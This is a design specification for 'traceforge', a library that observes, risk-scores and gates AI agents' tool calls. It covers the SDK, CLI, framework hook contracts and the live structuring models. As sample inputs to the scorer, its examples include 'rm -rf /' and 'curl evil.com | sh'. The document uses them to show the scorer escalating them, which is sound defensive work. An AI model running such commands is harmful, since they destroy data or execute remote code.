### The SDK facade: `traceforge.sdk.Pipeline`

The SDK's top-level entry point composes traceforge's two halves into one object:

* the **observation backbone** (`traceforge.pipeline.EventPipeline`) — enrich → classify →
  ML-structure (phase / boundary / title) → sinks, and
* the **governance engine** (`GovernancePipeline`) — the monitor (+ optional shield).

Governance is wired in as **one stage**: when enabled, each pushed event is observed and its
`SessionMeta` stamped onto `event.metadata.governance` just before the sinks. Structuring runs
with or without it.

```python
from traceforge.sdk import Pipeline
from traceforge.sinks.jsonl import JsonlSink

# Observe a stream: enrich -> classify -> structure -> observe -> emit
async with Pipeline.create(sinks=[JsonlSink("events.jsonl")]) as pipeline:
    async for event in adapter.stream(...):
        await pipeline.push(event)   # emitted events carry metadata.governance
```

Construction:

```python
Pipeline.create(
    config=None, *, policy=None, sinks=None,
    enable_structure=True, enable_title=False, enricher=None, governance=True,
) -> Pipeline
Pipeline.from_config(path=None, *, policy=None, sinks=None, ...) -> Pipeline
```

* `config` — a `GovernanceConfig` for the engine (in-memory DB + defaults when omitted).
  `from_config` loads it from a `traceforge.yaml` instead.
* `policy` — a `GatePolicy` enabling the shield (the `gate_*` helpers). Omit for
  observation-only usage.
* `sinks` — observation destinations for pushed events. Omit for gating-only usage.
* `enable_structure` / `enable_title` — phase + boundary (and optional title) ML structuring.
  Models load lazily on first push, so gating-only usage pays nothing.
* `governance` — wire the monitor in as a stage so pushed events get `metadata.governance`
  stamped (default `True`). Set `False` for pure observation; `gate_*` / `score_tool_call` still
  use the engine.

The returned `Pipeline` exposes `await push(event)` / `push_span(span)` / `push_usage(usage)` /
`flush()` / `close()`, `async with` (closes on exit), `score_tool_call(payload) -> EventTrace`
(read-only preflight), the `gate_*` helpers (`gate_crewai()`, `gate_langchain(tool)`,
`gate_langgraph(tools)`, `gate_semantic_kernel(kernel)`, `gate_maf()`,
`gate_smolagents(agent_cls=None)`, `gate_pydantic_ai(agent)`, `gate_openai_agents(agent)`), and
the `.governance` (engine) / `.backbone` (`EventPipeline`) escape hatches.

### The governance engine: `GovernancePipeline`

The composition root and facade, usable standalone. The `score` / `gate` CLIs and gating-only SDK
use go straight to it; the SDK facade delegates to it. It constructs the `SessionRegistry`,
`Assessor`, `SessionMonitor` (writer), `Scorer` (read-only preview), and `Shield`, then forwards
to them.

```python
from traceforge.governance.pipeline import GovernancePipeline

gov = GovernancePipeline.create()   # zero-config; or pass GovernanceConfig / policy=

# Preflight from a raw payload -> unified EventTrace, no state mutation
trace = gov.score_tool_call({
    "tool_name": "bash",
    "tool_input": {"command": "rm -rf /"},
    "session_id": "sess-abc",
})
# trace.stage == "assessed"; trace.risk_score == 66; trace.risk_band == "danger"
# trace.suggested_action == "escalate"; trace.reason == "risk_score_danger"
```

`EventTrace` (`traceforge.trace`) is the unified pipeline record — identity, classification, and
assessment on one frozen object (abridged):

```python
@dataclass(frozen=True, slots=True)
class EventTrace:
    id: str
    kind: EventKind
    session_id: str
    # classification (enricher fills)
    mechanism: Mechanism | None
    effect: Effect | None
    scope: tuple[Scope, ...]
    role: tuple[Role, ...]
    action: tuple[Action, ...]
    capability: tuple[Capability, ...]
    structure: tuple[Structure, ...]
    # assessment (assessor fills)
    risk_score: int | None
    risk_band: RiskBand | None
    suggested_action: Recommendation | None   # allow/warn/escalate/deny/transform
    reason: str | None                         # matched rule's reason code
    stage: TraceStage                          # adapted -> classified -> assessed
```

`SessionMeta` (`traceforge.governance.results`) is the richer stateful output attached to
`event.metadata.governance`: `classification`, `risk_assessment`, `recommendation` (a
`RiskRecommendation` with `.recommended_action`, `.reason_code`, `.transform`), `budget_snapshot`,
`drift`, `mcp_alerts`, `evidence`.

The recommendation enum (`traceforge.governance.results`):

```python
class RecommendedAction(StrEnum):
    ALLOW = "allow"
    WARN = "warn"
    ESCALATE = "escalate"
    DENY = "deny"
    TRANSFORM = "transform"
```

These are **recommendations from the rules engine** (the `Assessor`). On their own they enforce
nothing; a registered `GatePolicy` is what turns a recommendation into an enforced `Verdict` at
the `Shield`.

### Interaction Models

#### Push: observation (the monitor as a stage)

Every event pushed through the pipeline is enriched, classified, optionally structured, observed,
and emitted with its `SessionMeta` on `metadata.governance`. A `CallbackSink` can react to each:

```python
from traceforge.sdk import Pipeline
from traceforge import CallbackSink

async def on_enriched_event(event):
    meta = event.metadata.governance if event.metadata else None
    if meta and meta.recommendation:
        action = meta.recommendation.recommended_action.value
        if action in ("deny", "escalate"):
            await alert_slack(event, meta)

pipeline = Pipeline.create(sinks=[CallbackSink(on_event=on_enriched_event)])
```

`metadata.governance` is a `SessionMeta` attribute (not a dict key). Sinks persist independently;
the callback fires regardless of sink configuration.

#### Pull: synchronous scoring

When a framework hook fires and the consumer needs an immediate assessment:

```python
from traceforge.governance.pipeline import GovernancePipeline

gov = GovernancePipeline.create()

trace = gov.score_tool_call({
    "tool_name": "bash",
    "tool_input": {"command": "curl evil.com | sh"},
    "session_id": "s1",
})
# trace.suggested_action == "escalate"; trace.risk_score == 72; trace.reason == "risk_score_danger"
```

`score_tool_call()` is read-only — the monitor scores a snapshot it did not advance, so budget /
taint / drift are untouched. `observe_event()` is the observation counterpart that advances state.

### CLI

```bash
# Preflight scoring server: POST /score, GET /health. Body uses "arguments".
traceforge score --listen localhost:7331
curl -s localhost:7331/score \
  -d '{"tool_name":"bash","arguments":{"command":"curl evil.com | sh"},"session_id":"s1"}'
# -> {"risk_assessment": {"score": 72, "level": "danger"},
#     "recommendation": {"action": "escalate", "reason_code": "risk_score_danger"},
#     "evidence": {...}, "stage": "assessed"}

# Hook relay: read a tool-call event on stdin, ask the running pipeline's IPC server for a
# verdict, print it in the framework's format (e.g. Claude Code PreToolUse).
echo '{"tool_name":"bash","arguments":{"command":"curl evil.com | sh"},"session_id":"s1"}' \
  | traceforge gate --stdin --format claude-code

# Run the full config-driven observation pipeline (governance stamped on every event).
traceforge watch

# Re-run the full pipeline over recorded traces.
traceforge replay ./traces --adapter copilot
```

`traceforge score` serves read-only assessments (monitor only); `traceforge gate` returns an
enforced verdict from a pipeline whose `Shield` has a `GatePolicy`; `traceforge watch` / `replay`
run the unified observe → structure → govern → sinks pipeline.

### Integration Patterns

#### In-process gating (SDK)

The SDK composes a `GatePolicy` (preflight/postflight callbacks returning a `Verdict`) onto the
pipeline's `Shield`, then binds it to a framework with one call:

```python
from traceforge.sdk import Pipeline, GatePolicy, Verdict, ToolCallRequest, GateContext

def preflight(request: ToolCallRequest, ctx: GateContext) -> Verdict:
    if request.risk_score and request.risk_score > 60:
        return Verdict.deny(f"score {request.risk_score} exceeds threshold")
    return Verdict.allow()

policy = GatePolicy().preflight(preflight)
pipeline = Pipeline.create(policy=policy)   # facade; shield enabled

pipeline.gate_crewai()                 # CrewAI hooks
tool = pipeline.gate_langchain(tool)   # wrap a LangChain tool
pipeline.gate_maf()                    # Microsoft Agent Framework middleware
```

The `Shield` enforces the returned `Verdict` using each framework's native blocking mechanism.
The optional postflight callback receives the tool output for audit. (The `gate_*` helpers also
exist directly on `GovernancePipeline` for gating-only use.)

#### External gates (out-of-process PDP)

When the ALLOW/DENY decision should be made *outside* the Python process, `gate/external.py`
ships two drop-in preflight gates. Both implement the same synchronous `PreflightGate` protocol
(`(ToolCallRequest, GateContext) -> Verdict`) as an in-process callback, so they compose straight
into `GatePolicy().preflight(...)` with no adapter changes: the gate serializes a flat, redacted
JSON projection of the call (never the in-process `EventTrace` escape hatch) and maps the decider's
`{"decision": "deny", "reason": ...}` reply to a `Verdict` (an OPA-style `{"result": {...}}`
envelope is unwrapped automatically).

* **`HttpGate`** — POSTs the request to a persistent HTTP **Policy Decision Point** (e.g. an OPA
  REST server). Use for a centralized, org-wide PDP where policy lives outside the codebase.
* **`SubprocessGate`** — spawns a decider command per call and exchanges JSON over stdin/stdout.
  Use for air-gapped or non-Python gating (OPA `eval`, a shell script) with no long-lived server.

Both are **fail-closed by default** (`fail_open=False`): any error, timeout, non-2xx response,
non-zero exit, or unparseable output DENIES the call, so a broken decider never silently disables
enforcement. Both are **dependency-free** — stdlib `urllib` / `subprocess` only — and thread-safe.

```python
from traceforge.sdk import Pipeline, GatePolicy
from traceforge.gate.external import HttpGate

# Delegate every preflight decision to an external OPA PDP; fail closed on any error.
policy = GatePolicy().preflight(HttpGate(endpoint="http://localhost:8181/v1/data/traceforge/gate"))
pipeline = Pipeline.create(policy=policy)
pipeline.gate_crewai()   # same framework binding as an in-process gate
```

#### Shell hook (Copilot / Claude Code CLI)

The consumer's hook script pipes the tool-call event to `traceforge gate`, which relays it to the
running pipeline's IPC server and prints a verdict in the framework's format:

```bash
#!/bin/bash
# Claude Code PreToolUse hook — consumer's script
echo "$TOOL_EVENT_JSON" | traceforge gate --stdin --format claude-code
# the JSON/exit-code verdict is consumed by the agent's native hook contract
```

#### SDK callback (read-only)

Consumers that prefer to interpret recommendations themselves can score and branch:

```python
from traceforge.governance.pipeline import GovernancePipeline

gov = GovernancePipeline.create()

async def can_use_tool(tool_name, input_data, session_id):
    trace = gov.score_tool_call({
        "tool_name": tool_name,
        "tool_input": input_data,
        "session_id": session_id,
    })
    return trace.suggested_action not in ("deny", "escalate", "transform")
```

### What traceforge Owns vs What the Consumer Owns

| traceforge | Consumer |
|-----------|----------|
| Observation pipeline (always-on) | Which events / sources to observe |
| Event parsing (framework mappings) | Escalation flow (human-in-the-loop) |
| Classification + risk scoring (`Assessor`) | Notification channels (Slack, email) |
| Rule evaluation → `RecommendedAction` | Final authority over allow / deny |
| One session-state authority (taint, drift, budget) | Registering a `GatePolicy` (opt-in) |
| Storage (sinks) | Audit retention policy |
| `observe_event()` / `score_tool_call()` | Interpreting the assessment |
| Opt-in `Shield` → `Verdict` enforcement | Timeout / failure handling |

### The Single Flow

```
1. Agent session starts
2. traceforge observation pipeline starts (reads from configured source)
3. Events stream in -> parse -> enrich -> classify -> structure -> observe (monitor stage)
   • SessionState advances once per real tool call — the single writer, single counter
   • Each emitted event carries its SessionMeta on metadata.governance; sinks persist
4. IF a Shield (GatePolicy) is registered AND a pre-execution hook fires:
   a. Hook relays the pending call (score_tool_call / traceforge gate)
   b. Monitor scores it read-only against current session state
   c. GatePolicy maps the recommendation to a Verdict (allow / deny)
   d. Shield enforces via the framework's native mechanism, records the outcome in SessionState
5. Observation continues:
   • Allowed events: appear in source -> monitor advances state -> persist
   • Denied events: never in source, never committed -> no state mutation (budget stays accurate)
```

### Deduplication

`score_tool_call()` is **read-only** — it scores against accumulated state but does NOT advance
the counter, budget, taint, or drift. State changes only when the monitor observes an event from
its source via `observe_event` (confirming execution):

- **Allowed events:** observation sees them naturally, scores them, advances state, persists.
- **Denied events:** never appear in the source, so they never advance state.

Blocked calls therefore never corrupt budget / taint state. The monitor is the single source of
truth for state mutations.

### Configuration (`traceforge.yaml`)

The `governance` section configures the monitor + assessor. Same shape in YAML and SDK:

```yaml
# traceforge.yaml
governance:
  db_path: ./traceforge.db
  project_root: .
  pii_scanning: true
  rules_path: null          # null = bundled defaults
  budget:
    max_tool_calls: 200
    max_by_effect:
      destructive: 10
    max_by_capability: null
    max_by_scope: null

pipelines:
  copilot:
    source:
      type: file_watch
      path: ~/.config/github-copilot/chat.db
    adapter:
      type: mapped_json
      mapping: copilot
    sinks:
      - type: jsonl
        path: ./traces/copilot.jsonl
```

SDK equivalent (no YAML needed):

```python
from traceforge.config import GovernanceConfig, BudgetConfig
from traceforge.governance.pipeline import GovernancePipeline

gov = GovernancePipeline.create(GovernanceConfig(
    db_path="./traceforge.db",
    project_root=".",
    pii_scanning=True,
    budget=BudgetConfig(max_tool_calls=200, max_by_effect={"destructive": 10}),
))
```

Rules live in `classify/data/recommendation_rules.yaml`. They produce recommendations, not
enforcement decisions.

### Design Constraints

1. **One state authority** — `SessionState` owns a single tool-call counter and is mutated only
   through its own methods; there is no second counter and no external field access.
2. **Single writer** — only the `SessionMonitor` advances `SessionState`; the `Assessor` is
   side-effect-free, so a read-only score is an assessment of an un-advanced snapshot.
3. **Monitor observes, shield enforces** — observation recommends; enforcement is opt-in via a
   registered `GatePolicy`. Final authority stays with the consumer.
4. **Program to interfaces (DIP/OCP)** — `Assessor` and `GatePolicy` are injected strategies
   constructed at the `GovernancePipeline` composition root; collaborators depend on abstractions.
5. **Determinism** — non-deterministic enrichment is captured onto the event and never
   re-derived during state mutation, so replay reproduces the live assessment.
6. **No framework dependencies in the core** — the monitor / shield never import Copilot, Claude,
   LangGraph, etc.; the `gate_*` adapters wrap frameworks at the edge.
7. **Rules are data** — `recommendation_rules.yaml`. Turing-incomplete.
8. **Fail-closed enforcement** — any error inside the shield's chains yields DENY (preflight) or
   SUPPRESS (postflight); sinks and callbacks remain optional.

### Framework Compatibility

traceforge gates across two surfaces. **CLI / editor agents** wire a shell hook that shells out
to `traceforge gate --stdin`, which relays the tool call to the running pipeline's IPC server and
prints a verdict in the agent's native hook dialect. **In-process SDK frameworks** bind a `gate_*`
adapter that wraps the framework's native hook. Today `traceforge init` ships an injector for
**only Claude Code**; every other hook-capable agent must be wired manually (see PR-K).

#### CLI / editor agents (shell-hook gating)

"Hook-capable" = the agent exposes a **user-injectable, preflight, shell-out hook whose deny
blocks the tool**. Verified against each agent's primary first-party docs/source and
independently reconciled. **9 of 12 are hook-capable**; only Continue, Goose, and Aider are not
(static policy / no tool-call lifecycle). SWE-agent is the sole pure observe-only CLI agent.

| Agent | Capable? | Event | Config location | Deny contract | `init` injector |
|-------|:--------:|-------|-----------------|---------------|:---------------:|
| **Claude Code** | ✓ | `PreToolUse` | `~/.claude/settings.json` or `.claude/settings.json` | exit 2 OR stdout `hookSpecificOutput.permissionDecision:"deny"` | ✓ **shipped** |
| **GitHub Copilot CLI** (+ **Copilot Cloud**, same hook) | ✓ | `preToolUse` (+ earlier `permissionRequest`) | `~/.copilot/hooks/*.json`, `.github/hooks/*.json`, or `.github/copilot/settings.json` | stdout `{"permissionDecision":"deny",...}` OR non-zero exit **≠ 2** (exit 2 reserved → use **exit 1**) | ✗ |
| **OpenAI Codex CLI** | ✓ | `PreToolUse` (`[hooks]` system, **not** `notify`) | `~/.codex/hooks.json` or `[hooks]` in `~/.codex/config.toml` | exit 2 (stderr) OR `hookSpecificOutput.permissionDecision:"deny"` OR legacy `{"decision":"block"}` | ✗ |
| **Cursor** | ✓ (v1.7+) | `preToolUse` / `beforeShellExecution` / `beforeMCPExecution` | `~/.cursor/hooks.json` or `<project>/.cursor/hooks.json` | exit 2 OR `{"permission":"deny","user_message":...,"agent_message":...}`; per-hook `"failClosed":true` | ✗ |
| **Gemini CLI** | ✓ | `BeforeTool` | `~/.gemini/settings.json` or `.gemini/settings.json` | exit 2 (stderr) OR `{"decision":"deny","reason":...}` (`"block"` alias) | ✗ |
| **Cline** | ✓ (v4.0.0+) | `PreToolUse` | **script file** named `PreToolUse` in `<workspace>/.clinerules/hooks/` or `~/Documents/Cline/Hooks/` | stdout `{"cancel":true,"errorMessage":...}` **only** (no exit-2) | ✗ |
| **Amazon Q Developer CLI** | ✓ (v1.16.2+) | `preToolUse` | agent-config JSON: `~/.aws/amazonq/cli-agents/<name>.json` or `.amazonq/cli-agents/<name>.json` | **exit 2 only** (stderr → reason) | ✗ |
| **OpenCode** | ✓ (v1.17.15+) | `tool.execute.before` (plugin hook) | **JS/TS plugin** at `.opencode/plugins/*.ts` or `~/.config/opencode/plugins/*.ts` (or the `opencode.json` `"plugin"` array) | `throw new Error(reason)` in the plugin (throw when the gate exits non-zero); plugin gets Bun `$` to shell out to `traceforge gate --stdin` | ✗ |
| **OpenHands** | ✓ (sdk 1.33.0+) | `pre_tool_use` | `.openhands/hooks.json` (project) or `~/.openhands/hooks.json` (global) | exit 2 OR stdout `{"decision":"deny","reason":...}` OR `{"continue":false}`; stdin = `{event_type,tool_name,tool_input,session_id,working_dir}` | ✗ |
| **Continue** | ✗ | — | static tool-policy (allow/ask/exclude) in `config.yaml` | no shell-out lifecycle hook | — |
| **Goose** | ✗ | — | internal `permission_manager` / YAML + LLM "SmartApprove" | no external shell-out hook | — |
| **Aider** | ✗ | — | `--yes-always` / `--auto-commits` only | no tool-call lifecycle | — |

**Caveats to encode in the injectors/adapters:** Codex does **not** intercept the newer
`unified_exec` background-terminal path, and a Codex deny with an **empty**
`permissionDecisionReason` fails **OPEN**. Gemini requires "silence" — the hook must print nothing
to stdout except the final JSON. Cline is a VS Code extension, so its init target (a dropped script
file) differs from the CLI agents. Amazon Q treats any non-zero exit **other than 2** as
warning-only (the tool still runs). **OpenHands** hooks run **inside the agent sandbox**
(traceforge must be installed there; commit `.openhands/hooks.json` to the repo for cloud runs),
and an `async:true` hook **cannot block** — keep the gate hook sync. **OpenCode** is injected as a
**JS/TS plugin** that throws to deny, not a settings shell-hook. **Copilot Cloud** runs the hook in
the cloud runner, so traceforge must be present there (committed `.github/hooks/*.json` or machine
policy `policy.d`).

**Unified contract (PR-K design note):** the hook-capable agents converge on one shape — a command
fed tool-call JSON on stdin (`tool_name` + `tool_input`/`toolArgs` + `cwd` + session id) that
denies via exit-2 and/or a deny-JSON. **Claude Code's schema is the de facto standard** — Cursor
and Codex both implement `hookSpecificOutput.permissionDecision`, and Gemini aliases
`CLAUDE_PROJECT_DIR` — so `gate --stdin` can target a near-universal contract behind a thin
per-agent adapter selected by an `--agent <name>` tag the injector writes into the hook command.
**exit-2 = deny is a clean universal fallback for 7 of 9** (Claude, Codex, Gemini, Cursor,
Amazon Q, OpenHands; Copilot uses exit 1). The two that use no exit code at all: **Cline** (a JSON
`{"cancel":true}` script file) and **OpenCode** (a JS/TS plugin that throws to deny). Other
divergences: **Amazon Q** is exit-2-only, and **OpenHands** runs in-sandbox and must stay
`async:false` to block. PR-K adds **8 injectors** (Copilot CLI, Codex, Gemini, Cline, Cursor,
Amazon Q, OpenCode, OpenHands; Claude Code already ships; Copilot Cloud rides Copilot CLI's
injector).

#### In-process SDK frameworks (`gate_*` adapters)

| Framework | Consumer entry point | Notes |
|-----------|----------------------|-------|
| **CrewAI** | `pipeline.gate_crewai()` | global hooks; preflight + postflight |
| **LangChain** | `pipeline.gate_langchain(tool)` → wrapped tool | sync `_run` only today (async `_arun` pending) |
| **LangGraph** | `pipeline.gate_langgraph(tools)` → gated tool node | preflight + postflight |
| **Semantic Kernel** | `pipeline.gate_semantic_kernel(kernel)` | installs a gating filter |
| **MAF (agent-framework)** | `pipeline.gate_maf()` → middleware | preflight + postflight |
| **smolagents** | `pipeline.gate_smolagents(agent_cls=None)` → gated class | preflight + postflight |
| **PydanticAI** | `pipeline.gate_pydantic_ai(agent)` | per-agent toolset wrap; `ctx.run_id` session id |
| **OpenAI Agents** | `pipeline.gate_openai_agents(agent)` → gated agent | input-guardrail today (per-tool gating + postflight pending) |

Read-only scoring for any surface is available via `pipeline.score_tool_call(...)` without
registering a `GatePolicy` — this is how the Copilot and Claude Code SDKs fold in (read-only, not
blocking). **SWE-agent** is the sole pure observe-only CLI agent: no injectable pre-execution hook
today, so traceforge observes and scores its events but no consumer can block its tool calls.

### File Structure

```
src/traceforge/
├── pipeline.py              # EventPipeline — observation backbone + governance stage
├── enricher.py              # Classification + risk enrichment
├── trace.py                 # EventTrace, TraceStage (unified record)
├── governance/              # The monitor + shield engine
│   ├── pipeline.py          # GovernancePipeline — composition root / facade (delegates)
│   ├── monitor.py           # SessionMonitor — single writer (observe / process / lifecycle)
│   ├── scorer.py            # Scorer — read-only preview (score_tool_call* / preflight)
│   ├── context.py           # ContextBuilder — payload / event -> EnrichmentContext
│   ├── phase1.py            # Phase1 — the Phase-1 state-advance step (writer + preview share it)
│   ├── registry.py          # SessionRegistry — residency + LRU eviction + reservations
│   ├── assessor.py          # Assessor — (snapshot, event) -> SessionMeta (label+risk+drift)
│   ├── codec.py             # MetaCodec — (de)serialize SessionMeta + snapshots
│   ├── shield.py            # Shield — gate context + preflight/postflight + record allow/deny
│   ├── state.py             # SessionState — one counter, mutated only via methods
│   ├── persistence.py       # SystemStore — durability (reservations, atomic commit)
│   ├── results.py           # RecommendedAction, RiskRecommendation, SessionMeta
│   ├── labeler.py           # GovernanceLabeler
│   ├── rules.py             # Rule, Predicate, evaluate_rules()
│   └── ...                  # pii, ifc, integrity, drift, budget, observer
├── sdk/                     # Pipeline facade + GatePolicy + Verdict + gate_* helpers
│   ├── pipeline.py          # Pipeline — backbone + governance stage + gating delegates
│   ├── gate_policy.py       # GatePolicy (Policy strategy)
│   ├── gate_types.py        # GateContext, ToolCallRequest/Result, PostflightVerdict
│   └── verdict.py           # Verdict
├── gate/                    # Cross-process gate IPC (traceforge gate)
├── gates/                   # Bundled detectors (PII)
├── classify/                # Classification engine + data/recommendation_rules.yaml
└── sinks/                   # Storage backends
```

---

## §23 — Live Structuring (Phase, Boundary & Title)

Three CPU-only, torch-free models run at the `EventPipeline` layer and turn a flat event stream into
navigable structure **live**, as events arrive. Phase and boundary inference **stamp event metadata in
place**; titling runs **out-of-band**. All inference is **causal** — each decision uses only the events
seen so far, never look-ahead and never an end-of-session batch pass — so structure is available
mid-session and survives `SESSION_ENDED` / `SESSION_PAUSED`.

| Model | Module | Output | Default |
|-------|--------|--------|---------|
| Phase classifier | `traceforge.phase` | `metadata.phase` (per event) | on (`enable_phase`) |
| Boundary decoder | `traceforge.boundary` | `metadata.boundary` + `activity_id` / `step_id` | on (`enable_boundary`) |
| Titler | `traceforge.title` | `TitleUpdate` records (out-of-band) | off (`enable_title`) |

### 23.1 — Shared foundations

- **Frozen embedder.** Both the phase and boundary models embed event text with a frozen
  [model2vec](https://github.com/MinishLab/model2vec) static embedder, `minishlab/potion-base-8M`
  (256-dimensional). The weights are vendored under `phase/data/potion-base-8M/`; embedding is a pure
  lookup with **zero network access** and no torch. Input text is truncated to `MAX_TEXT_CHARS = 2000`.
- **Shared featuriser.** `traceforge.phase.features` builds the symbolic + embedded design matrix for
  **both** models, so there is no train/serve skew and no second feature implementation to drift.
- **Causal segmentation primitives.** A categorical **Bayesian Online Changepoint Detection** (BOCPD;
  Adams & MacKay 2007 — a Dirichlet-multinomial predictive with a constant hazard) plus trailing neighbor
  centroids and windowed majority / entropy features give both models a run-length signal computed online.
- **CPU-only / torch-free guarantee.** The only runtime dependencies are `model2vec`, `scikit-learn`,
  `scipy`, `joblib`, `onnxruntime`, `tokenizers`, and `numpy`. **`torch` and `transformers` are never
  imported at runtime.** These ML dependencies are part of the **core** package (not an optional extra)
  and are imported lazily, so an unused subsystem costs nothing.

### 23.2 — Phase classifier (`src/traceforge/phase/`)

Stamps `metadata.phase` with the session-aware workflow stage.

- **Classes.** `planning`, `implementation`, `verification`, `exploration` (a legacy `review` class is
  folded into `verification`).
- **Model.** A scikit-learn head (LogisticRegression / HistGradientBoosting) over a design matrix that
  concatenates a `DictVectorizer` of symbolic features with the 256-d frozen embedding. The shipped
  feature set is `combined-seg-nbrcentroid`, which reaches a leave-session-out macro-F1 of **0.931**
  (within 0.0004 of the look-ahead upper bound while remaining fully causal).
- **Symbolic features.** `kind`, `tool_name`, `mechanism`, `effect`, `shell_dialect`, `scope`, `role`,
  `action`, `capability`, `structure`, and `phase_signals`.
- **Segmentation.** `SegmentationParams` exposes the window sizes, `entropy_window`, and the BOCPD
  hyper-parameters (`bocpd_expected_run_length`, `bocpd_alpha`, `bocpd_r_max`).
- **Live streaming.** `SessionPhaseStream` produces the identical result event-for-event as a batch pass.
  Content-bearing events are classified; low-signal "plumbing" events inherit the prevailing phase (marked
  `inherited: true`); only leading plumbing (before any classifiable event) is briefly held. The
  production stamp is the argmax class.
- **Single producer.** The trained classifier is the **only** phase producer; there is no deterministic
  fallback (a missing model bundle raises rather than silently degrading). The deterministic
  `traceforge.tracking.PhaseTracker` is a **research feature signal, not part of the live path.**
- **Model resolution.** Explicit argument → `$TRACEFORGE_PHASE_MODEL` → the packaged
  `phase/data/phase-model.joblib`.

### 23.3 — Boundary decoder (`src/traceforge/boundary/`)

Stamps `metadata.boundary` live, yielding an activity / step table of contents.

- **Classes.** A single-label per-**gap** classifier over `noise`, `activity-boundary`, `step-boundary`.
- **Features.** Feature set `combined-seg`, built by the **shared** `traceforge.phase.features` over the
  gap between event *t* and its successor *t+1* (symbolic change indicators for both events + their
  model2vec embeddings + the causal BOCPD / majority-vote signals).
- **Causality.** The gap after event *t* is decided only once *t+1* arrives; the boundary is stamped on
  the **successor** — the event that *opens* the new segment. Continuation events carry `boundary = None`.
- **Streaming decode.** `StreamingBoundaryDecoder` / `DecodeParams` apply a learned per-class threshold
  *t_c* (the F1-optimal precision/recall point) and a per-class refractory **minimum gap** *g_c* (learned
  from gold segment spacing) — a streamable form of non-maximum suppression. Coarser boundaries win ties
  (activity before step). Decoding is O(1) per gap; with no `decode_params` it falls back to argmax.
- **Model.** Packaged `boundary/data/boundary-model.joblib`.

### 23.4 — Titler (`src/traceforge/title/`)

Produces human-readable activity / step titles, emitted **out-of-band**.

- **Model.** A tiny `flan-t5-small` distilled via **sequence-level knowledge distillation** (seq-KD) from
  an LLM teacher, then exported to **int8 split-ONNX**: `encoder.onnx` + `decoder.onnx` + `tokenizer.json`
  (~96 MB total). It is served CPU-only through `onnxruntime` + `tokenizers` + `numpy` — **no torch, no
  transformers** (resident set ~250 MB versus ~1 GB for a torch runtime). ONNX Runtime is pinned to a
  single thread (`CPUExecutionProvider`).
- **Model resolution.** `$TRACEFORGE_TITLE_MODEL` → packaged `traceforge_title_model` → in-tree
  `title/data/` dev fallback.
- **Decoding.** Single-pass beam search (`num_beams = 5`, `max_new_tokens = 32`,
  `no_repeat_ngram_size = 2`, `repetition_penalty = 1.3`, `length_penalty = 0.8`) under the task prefix
  `"summarize agent step: "`, guarded by a grounding gate (`TITLE_GROUND`, default on) with adaptive beam
  escalation.
- **Inputs.** The "distilled context" slots produced by `title/context.py::distilled_context`: `intent`,
  `actions`, `files` (minus a corpus-learned boilerplate set frozen into
  `title/data/boilerplate_files.json`), `symbols`, and `notes`. The same projection is used at training
  and serving time, so there is no skew.
- **Cadence.** Titling runs once per **segment** (never per event) and the model is lazily loaded on the
  first segment close.
- **Out-of-band contract.** `SessionTitleStream` stamps each event's `activity_id` / `step_id` live and
  releases the event immediately. When a segment closes it publishes an **append-only** `TitleUpdate`
  keyed by `segment_id` (`kind ∈ {session, activity, step}`; a `step` carries its activity's id as
  `parent_id`). `TitleUpdate.version` lets a provisional title be revised idempotently — consumers keep the
  highest version per `segment_id`. **Emitted events are never mutated:** in the live path
  `metadata.activity_title` / `step_title` stay `None`; a batch sink may materialize them by folding
  `TitleUpdate`s back onto events at replay.
- **Sink contract.** `Sink.on_title_update` (in `sinks/base.py`) defaults to a one-time warning rather
  than a silent drop — titles are primary output. All in-repo sinks override it.

### 23.5 — Session naming (separate from span titles)

Naming the **session** as a whole is a distinct subsystem — deliberately **not** the span titler (a
distilled request-head was measured at ~9% coherent and dropped).

- **Default: heuristic.** A zero-dependency extractive cascade (`title/heuristics.py`, exposed via
  `title/naming.py::HeuristicProvider`) — free, offline, immediate, and non-blocking. It emits a
  `kind = "session"` `TitleUpdate` (keyed by `segment_id == session_id`) the instant the first substantive
  user message arrives.
- **Opt-in: API refiner.** A LiteLLM-backed tier (`ApiProvider` / `_WithFallback` /
  `build_session_titler_split`) engages only when the strategy is `api` **and** an API key is present in
  the environment (the key is **never** read from config). It runs off the hot path on a worker thread and
  emits a later, refined `kind = "session"` `TitleUpdate` (`refine_title` / `take_session_refinement`).

### 23.6 — Live-stamping & enablement contract

- `enable_phase` — default **on**; stamps `metadata.phase` live.
- `enable_boundary` — default **on**; stamps `metadata.boundary` (and assigns `activity_id` / `step_id`)
  live.
- `enable_title` — default **off** (opt-in); emits `TitleUpdate` records out-of-band.
- Live structuring runs at the `EventPipeline` layer, alongside — not inside — the enricher (which owns
  classification and risk). Structuring is the pipeline's observation plane and feeds sinks directly
  (including `on_title_update`).

### 23.7 — Packaging

The base `traceforge` wheel is **model-free only for the titler.** Its build force-includes the small model
artifacts — `phase/data/*.joblib`, `phase/data/potion-base-8M/*`, `boundary/data/*.joblib`, and
`title/data/*.json` — so the **phase and boundary sklearn heads and the frozen model2vec embedder ship in
the base wheel.** Only the large T5 titler weights are split out, into a separate distribution
**`traceforge-title-model`** (`encoder.onnx` / `decoder.onnx` / `tokenizer.json`). That distribution is a
**hard runtime dependency** (`traceforge-title-model >= 0.2` in `[project.dependencies]`), **not** an
optional extra. `title/_resolve.py::span_dir()` resolves the weights as: `$TRACEFORGE_TITLE_MODEL` (if set)
→ installed `traceforge_title_model` package → in-tree `title/data/` dev fallback → raise with an install
hint. Git-LFS pointer stubs are
rejected via a minimum-byte-size guard, so a partial checkout fails loudly instead of loading a stub.

---

## §24 — Success Criteria

The library is "done" when:

1. **Three sink implementations** (SQLite, JSONL, Callback) are production-quality with tests
2. **CLI runner** can start all pipelines from `traceforge.yaml` and run indefinitely
3. **Any JSONL-emitting framework** can be added with only a YAML file (no code)
4. **Non-JSONL frameworks** (Copilot SQLite, Aider markdown) work via parser + mapping
5. **Classification** is stable: tool taxonomy covers 95%+ of observed tool calls without `unknown`
6. **Risk scoring** produces meaningful differentiation (not all-50s)
7. **End-to-end latency** from event ingestion to sink write is < 10ms p99 for in-memory sinks
8. **Zero-crash guarantee**: malformed input, failed sinks, and unexpected data never crash the pipeline
9. **Config bootstrap**: first `pip install traceforge-toolkit` + any config access creates `~/.traceforge/` with working defaults
10. **CI green**: lint + tests pass on Python 3.11, 3.12, 3.13
